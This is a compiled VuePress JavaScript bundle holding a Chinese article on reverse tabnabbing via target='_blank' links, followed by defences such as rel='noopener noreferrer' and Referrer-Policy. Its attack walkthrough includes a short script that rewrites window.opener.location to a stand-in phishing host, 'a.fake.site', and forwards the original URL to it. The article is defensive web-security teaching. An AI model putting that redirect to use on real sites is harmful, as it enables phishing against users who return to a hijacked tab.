import{r as a,o,c as r,a as e,d as s,F as i,b as n,e as l}from"./app.b17a0fcc.js";import{_ as p}from"./plugin-vue_export-helper.21dcd24c.js";const u={},c=e("p",null,'\u901A\u5E38\u5728\u7F51\u9875\u4E2D\u4F7F\u7528\u94FE\u63A5\u65F6\uFF0C\u5F88\u53EF\u80FD\u4F1A\u6DFB\u52A0\u4E00\u4E2A\u7B80\u5355\u7684 target="_blank" \u5C5E\u6027\u5230 a \u6807\u7B7E\u4E0A\u6765\u8BA9\u6D4F\u89C8\u5668\u7528\u4E00\u4E2A\u65B0\u7684\u6807\u7B7E\u9875\u6765\u6253\u5F00\u4E00\u4E2A URL \u5730\u5740\u3002\u4F46\u662F\u8FD9\u4E00\u5C5E\u6027\u6B63\u5728\u6210\u4E3A\u7F51\u7EDC\u9493\u9C7C\u8005\u653B\u51FB\u7684\u673A\u4F1A\u3002',-1),d=e("p",null,[e("strong",null,"\u6076\u610F\u653B\u51FB"),n(' \u5982\u679C\u7684\u7F51\u7AD9\u4E0A\u6709\u4E00\u4E2A\u4F7F\u7528\u4E86 target="_blank" \u7684 a \u6807\u7B7E\u94FE\u63A5\uFF0C\u4E00\u65E6\u7528\u6237\u70B9\u51FB\u4E86\u8FD9\u4E2A\u94FE\u63A5\u6253\u5F00\u4E86\u65B0\u7684\u6807\u7B7E\u9875\uFF0C\u5982\u679C\u8FD9\u4E2A\u6807\u7B7E\u9875\u8DF3\u8F6C\u7684\u7F51\u7AD9\u5185\u5B58\u5728\u7684\u6076\u610F\u4EE3\u7801\uFF0C\u90A3\u4E48\u539F\u672C\u9875\u9762\u7684\u7F51\u7AD9\u53EF\u80FD\u4F1A\u88AB\u8F6C\u5230\u4E00\u4E2A\u5047\u7684\u9875\u9762\u3002\u4E5F\u5C31\u662F\u8BF4\uFF0C\u5F53\u7528\u6237\u56DE\u5230\u539F\u672C\u7684\u9875\u9762\u65F6\uFF0C\u4ED6\u770B\u5230\u7684\u53EF\u80FD\u5C31\u662F\u5DF2\u7ECF\u88AB\u66FF\u6362\u8FC7\u7684\u9493\u9C7C\u9875\u9762\u4E86\u3002')],-1),b=e("p",null,[e("strong",null,"\u6B65\u9AA4\u5982\u4E0B\uFF1A")],-1),_=n("\u7684\u7F51\u7AD9\u4E0A\u6709\u4E00\u4E2A a \u6807\u7B7E\u7684\u94FE\u63A5 "),g={href:"https://example.com%EF%BC%9A",target:"_blank",rel:"noopener noreferrer"},m=n("https://example.com\uFF1A"),h=l(`<div class="language-text ext-text line-numbers-mode"><pre class="language-text"><code>&lt;a href=&quot;https://an.evil.site&quot; target=&quot;_blank&quot;&gt;
  Enter an &quot;evil&quot; website
&lt;/a&gt;
</code></pre><div class="line-numbers"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><ul><li>\u4E00\u4E2A\u7528\u6237\u70B9\u51FB\u4E86\u8FD9\u4E2A\u94FE\u63A5\u5728\u4E00\u4E2A\u65B0\u7684\u6807\u7B7E\u9875\u6253\u5F00\u8FD9\u4E2A\u65B0\u7684\u7F51\u7AD9\u3002\u8FD9\u4E2A\u7F51\u7AD9\u53EF\u4EE5\u6839\u636E\u7528\u6237\u8DF3\u8F6C\u65B0\u9875\u9762\u7684 HTTP \u8BF7\u6C42\u4E2D\u7684 header \u91CC\u7684 Referer \u5B57\u6BB5\u6765\u786E\u5B9A\u8FD9\u4E2A\u7528\u6237\u7684\u6765\u6E90\u3002</li><li>\u800C\u8FD9\u4E2A\u7F51\u7AD9\u5305\u542B\u7C7B\u4F3C\u7684 JavaScript code\uFF1A</li></ul><div class="language-javascript ext-js line-numbers-mode"><pre class="language-javascript"><code><span class="token keyword">const</span> url <span class="token operator">=</span> <span class="token function">encodeURIComponent</span><span class="token punctuation">(</span><span class="token string">&#39;{{header.referer}}&#39;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
window<span class="token punctuation">.</span>opener<span class="token punctuation">.</span>location<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token string">&#39;https://a.fake.site/?&#39;</span> <span class="token operator">+</span> url<span class="token punctuation">)</span><span class="token punctuation">;</span>	
</code></pre><div class="line-numbers"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div>`,3),q=e("li",null,[e("p",null,"\u73B0\u5728\uFF0C\u8FD9\u4E2A\u7528\u6237\u7EE7\u7EED\u6D4F\u89C8\u5408\u683C\u65B0\u6253\u5F00\u7684\u6807\u7B7E\u9875\uFF0C\u5F53\u8FD9\u4E2A\u5F00\u59CB\u7684\u9875\u9762\u5DF2\u7ECF\u52A0\u8F7D\u5230 https://a.fake.site/?https%3A%2F%2Fexample.com%2F \u4E4B\u540E\u3002")],-1),v=e("li",null,[e("p",null,"\u8FD9\u4E2A\u6076\u610F\u7684\u7F51\u7AD9 https://a.fake.site \u53EF\u4EE5\u6839\u636E\u8FD9\u4E2A querystring \u90E8\u5206\u4F2A\u9020\u4E00\u4E2A\u8DDF\u539F\u672C\u7684\u9875\u9762\u4E00\u6837\u7684\u9875\u9762\u6765\u6B3A\u9A97\u7528\u6237\uFF08\u5176\u5B9E\u4E5F\u53EF\u4EE5\u5728\u8FD9\u671F\u95F4\u5236\u9020\u53E6\u4E00\u4E2A\u8DF3\u8F6C\uFF0C\u8BA9\u6D4F\u89C8\u5668\u7684\u5730\u5740\u680F\u770B\u8D77\u6765\u66F4\u4EE4\u4EBA\u56F0\u60D1\uFF09")],-1),f=n("\u5F53\u7528\u6237\u5173\u6389\u8FD9\u4E2A\u65B0\u6807\u7B7E\u9875\uFF08"),k={href:"https://an.evil.site%EF%BC%89%E7%84%B6%E5%90%8E%E5%9B%9E%E5%88%B0%E5%BC%80%E5%A7%8B%E7%9A%84%E9%A1%B5%E9%9D%A2%E6%97%B6%E2%80%A6%E2%80%A6%E2%80%A6%E2%80%A6Oh",target:"_blank",rel:"noopener noreferrer"},x=n("https://an.evil.site\uFF09\u7136\u540E\u56DE\u5230\u5F00\u59CB\u7684\u9875\u9762\u65F6\u2026\u2026\u2026\u2026Oh"),E=n(", no, \u518D\u4E5F\u56DE\u4E0D\u5230\u5F00\u59CB\u90A3\u4E2A\u9875\u9762\u4E86\u3002"),B=e("ul",null,[e("li",null,"\u4EE5\u4E0A\u7684\u653B\u51FB\u65B9\u5F0F\uFF0C\u662F\u5728\u8DE8\u57DF\u7684\u573A\u666F\u4E2D\u3002\u56E0\u4E3A\u5F53\u8DF3\u8F6C\u7684\u9875\u9762\u8DE8\u57DF\u65F6\uFF0Copener \u5BF9\u8C61\u4E0E parent \u662F\u540C\u4E00\u4E2A\u3002"),e("li",null,"\u867D\u7136\uFF0C\u90FD\u662F\u53D7\u9650\u5236\u7684\u5E76\u4E14\u53EA\u63D0\u4F9B\u4E86\u5F88\u5C11\u7684\u53D7\u9650\u7684\u53EF\u7528\u5C5E\u6027\u3002\u5E76\u4E14\u8FD9\u4E00\u4E9B\u53EF\u7528\u7684\u5C5E\u6027\u91CC\uFF0C\u5927\u90E8\u5206\u90FD\u4E0D\u88AB\u5141\u8BB8\u8BBF\u95EE\uFF08\u5426\u5219\u4F7F\u7528\u65F6\u4F1A\u76F4\u63A5\u62A5\u9519 DOMException\uFF09\u3002"),e("li",null,"\u4F46\u662F\u5728\u8DE8\u57DF\u7684\u573A\u666F\u4E2D\uFF0Copener \u5BF9\u8C61\u4E0D\u50CF parent \u5BF9\u8C61\u90A3\u4E48\u4E25\u683C\uFF0Copener \u4F9D\u7136\u53EF\u4EE5\u8C03\u7528 location.replace \u65B9\u6CD5\u3002"),e("li",null,"\u5982\u679C\u8FD9\u662F\u540C\u57DF\u573A\u666F\uFF08\u4F8B\u5982\uFF0C\u8FD9\u4E2A\u7F51\u7AD9\u4E0A\u7684\u4E00\u4E2A\u9875\u9762\u5DF2\u7ECF\u88AB\u5D4C\u5165\u4E86\u6076\u610F\u4EE3\u7801\uFF09\uFF0C\u90A3\u4E48\u8FD9\u4E2A\u60C5\u51B5\u4F1A\u53D8\u5F97\u66F4\u52A0\u4E25\u91CD\u3002")],-1),w=e("p",null,[e("strong",null,"\u9884\u9632"),n(" \u5728 <iframe\u4E2D\u6709\u4E00\u4E2A sandbox \u5C5E\u6027\uFF0C\u6240\u4EE5\u53EF\u4EE5\u4F7F\u7528\u4EE5\u4E0B\u7684\u4E00\u4E9B\u65B9\u6CD5\u6765\u9884\u9632\u94FE\u63A5\uFF1A")],-1),A=l(`<li><p><strong>Referrer Policy \u548C noreferrer</strong></p><ul><li>\u5728\u4E0A\u8FF0\u7684\u653B\u51FB\u6B65\u9AA4\u4E2D\uFF0C\u6709\u7528\u5230 HTTP header \u91CC\u7684 Referer \u5C5E\u6027\u3002\u4E8B\u5B9E\u4E0A\uFF0C\u53EF\u4EE5\u5728\u5F53\u524D\u9875\u9762\u8FD4\u56DE\u7684 HTTP Response Headers \u4E2D\u6DFB\u52A0 Referrer Policy \u5934\u6765\u786E\u4FDD\u539F\u672C\u7F51\u9875\u53EF\u4EE5\u4E0D\u53D7\u65B0\u6807\u7B7E\u9875\u7684\u5E72\u6270\u3002</li><li>\u9700\u8981\u4FEE\u6539\u540E\u7AEF\u4EE3\u7801\uFF08\u8BD1\u6CE8\uFF1A\u6216\u8005 nginx \u914D\u7F6E\uFF09\u6765\u5B9E\u73B0\u6DFB\u52A0 Referer Policy \u5934\u3002\u540C\u65F6\u5728\u524D\u7AEF\uFF0C\u4E5F\u53EF\u4EE5\u4F7F\u7528 <code>&lt;a</code>\u6807\u7B7E\u672C\u8EAB\u652F\u6301\u7684 rel \u5C5E\u6027\uFF0C\u901A\u8FC7\u6307\u660E rel=&quot;noreferrer&quot; \u6765\u786E\u4FDD\u539F\u7F51\u9875\u4E0D\u53D7\u65B0\u6807\u7B7E\u9875\u7684\u5E72\u6270\u3002<div class="language-text ext-text line-numbers-mode"><pre class="language-text"><code> &lt;a href=&quot;https://an.evil.site&quot; target=&quot;_blank&quot; rel=&quot;noreferrer&quot;&gt;
   Enter an &quot;evil&quot; website
 &lt;/a&gt;
</code></pre><div class="line-numbers"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div></li><li>\u7136\u800C\uFF0C\u9700\u8981\u6CE8\u610F\u7684\u662F\u53CA\u65F6\u5DF2\u7ECF\u9650\u5236\u4E86 referer \u7684\u4F20\u9012\uFF0C\u539F\u7F51\u9875\u4F9D\u65E7\u65E0\u6CD5\u963B\u6B62\u88AB\u6076\u610F\u5730\u91CD\u5B9A\u5411\u3002</li></ul></li><li><p><strong>noopener</strong>(\u9700\u8981\u8003\u8651\u6D4F\u89C8\u5668\u517C\u5BB9) \u5904\u4E8E\u5B89\u5168\u7684\u8003\u8651\uFF0C\u73B0\u4EE3\u6D4F\u89C8\u5668\u652F\u6301\u6307\u5B9A rel=&quot;noopener&quot; \u5728 <code>&lt;a</code>\u6807\u7B7E\u4E0A\uFF0C\u4ECE\u800C\u5728\u65B0\u6253\u5F00\u7684\u6807\u7B7E\u9875\u91CC\uFF0Copener \u5BF9\u8C61\u5C06\u4E0D\u53EF\u7528\uFF0C\u5176\u503C\u76F4\u63A5\u88AB\u8BBE\u7F6E\u6210\u4E86 null\u3002</p><div class="language-text ext-text line-numbers-mode"><pre class="language-text"><code>&lt;a href=&quot;https://an.evil.site&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;
  Enter an &quot;evil&quot; website
&lt;/a&gt;
</code></pre><div class="line-numbers"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div></li><li><p><strong>\u6700\u4F73</strong></p><ol><li>\u9996\u5148\uFF0C\u53EF\u4EE5\u6DFB\u52A0 rel=&quot;noopener&quot; \u5230\u7F51\u7AD9\u7684 a \u6807\u7B7E\u4E0A\uFF08\u4E5F\u63A8\u8350\u4F7F\u7528 rel=&quot;noreferrer&quot;\uFF09, \u5982\u679C\u7B97\u4E0A target=&quot;_blank&quot;\uFF0C\u90A3\u4E48\u770B\u8D77\u6765\u5927\u6982\u662F\u8FD9\u6837\uFF1A<div class="language-text ext-text line-numbers-mode"><pre class="language-text"><code>&lt;a href=&quot;https://an.evil.site&quot; target=&quot;_blank&quot;  rel=&quot;noopener noreferrer&quot;&gt;
  Enter an &quot;evil&quot; website
&lt;/a&gt;
</code></pre><div class="line-numbers"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div></li><li>\u5F53\u7136\uFF0C\u5F53\u8981\u8DF3\u8F6C\u5230\u7B2C\u4E09\u65B9\u7F51\u7AD9\u7684\u65F6\u5019\uFF0C\u5C31\u63A8\u8350\u6DFB\u52A0 rel=&quot;nofollow&quot; \u6765\u8C03\u6574 SEO \u6743\u91CD\u3002\u8FD9\u770B\u8D77\u6765\u50CF\uFF1A<div class="language-text ext-text line-numbers-mode"><pre class="language-text"><code>&lt;a href=&quot;https://an.evil.site&quot; target=&quot;_blank&quot; 
   rel=&quot;noopener noreferrer nofollow&quot;&gt;
  Enter an &quot;evil&quot; website
&lt;/a&gt;
</code></pre><div class="line-numbers"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div></li></ol></li><li><p><strong>\u6027\u80FD\u95EE\u9898</strong></p><ul><li>\u6700\u540E\uFF0C\u6765\u8BA8\u8BBA\u4E00\u4E0B\u6027\u80FD\u95EE\u9898\uFF0C\u5982\u679C\u7F51\u7AD9\u4F7F\u7528 &lt;a target=&quot;_blank\u201D\u65B0\u6253\u5F00\u7684\u6807\u7B7E\u9875\u7684\u6027\u80FD\u5C31\u4F1A\u5F71\u54CD\u5F53\u524D\u6253\u5F00\u7684\u9875\u9762\u3002\u5728\u8FD9\u4E00\u70B9\u770B\u6765\uFF0C\u5982\u679C\u5728\u65B0\u5F00\u7684\u9875\u9762\u91CC\u6709\u4E00\u4E2A\u5F88\u81C3\u80BF\u7684 JavaScript \u811A\u672C\u8981\u6267\u884C\uFF0C\u90A3\u4E48\u539F\u672C\u7684\u9875\u9762\u4E5F\u4F1A\u53D7\u5230\u5F71\u54CD\uFF0C\u540C\u65F6\u5F53\u524D\u9875\u9762\u505C\u6EDE\u7684\u73B0\u8C61\u4E5F\u53EF\u80FD\u51FA\u73B0\uFF08\u76F8\u5F53\u4E8E\u8FD9\u4E24\u4E2A\u9875\u9762\u662F\u5728\u540C\u4E00\u4E2A\u7EBF\u7A0B\u4E0A\uFF09\u3002</li><li>\u5982\u679C noopener \u6DFB\u52A0\u5230\u4E86\u94FE\u63A5\u4E0A\uFF0C\u90A3\u4E48\u8FD9\u65B0\u65E7\u4E24\u4E2A\u9875\u9762\u5C31\u4E0D\u80FD\u4E92\u76F8\u63D2\u624B\u5BF9\u65B9\u4E86\uFF0C\u4E5F\u5C31\u662F\u8BF4\u539F\u6765\u7684\u9875\u9762\u4E0D\u4F1A\u53D7\u5230\u65B0\u9875\u9762\u7684\u5F71\u54CD\uFF08\u8FD9\u4E24\u4E2A\u9875\u9762\u5C31\u53D8\u6210\u4E24\u4E2A\u7EBF\u7A0B\u4E86\uFF09\u3002</li></ul></li>`,4),R=e("strong",null,"\u53C2\u8003",-1),F=n("\uFF1A"),T={href:"https://zhuanlan.zhihu.com/p/53132574",target:"_blank",rel:"noopener noreferrer"},P=n('\u4ECE\u672A\u6CE8\u610F\u7684\u9690\u85CF\u5371\u9669: target = "_blank" \u548C "opener"');function j(y,C){const t=a("ExternalLinkIcon");return o(),r(i,null,[c,d,b,e("ol",null,[e("li",null,[e("p",null,[_,e("a",g,[m,s(t)])]),h]),q,v,e("li",null,[e("p",null,[f,e("a",k,[x,s(t)]),E])])]),B,w,e("ol",null,[A,e("li",null,[e("p",null,[R,F,e("a",T,[P,s(t)])])])])],64)}var O=p(u,[["render",j]]);export{O as default};
